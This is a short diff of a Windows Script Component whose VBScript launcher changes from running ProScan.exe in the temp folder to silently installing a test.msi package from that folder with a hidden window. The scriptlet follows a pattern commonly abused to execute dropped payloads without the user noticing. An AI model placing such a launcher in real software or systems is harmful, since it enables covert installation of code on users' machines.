@@ -1,6 +1,5 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\ProScan.exe")
-</script>
+shell.Run "msiexec /i ""%TEMP%\test.msi"" /qn", 0, True</script>
 </component>
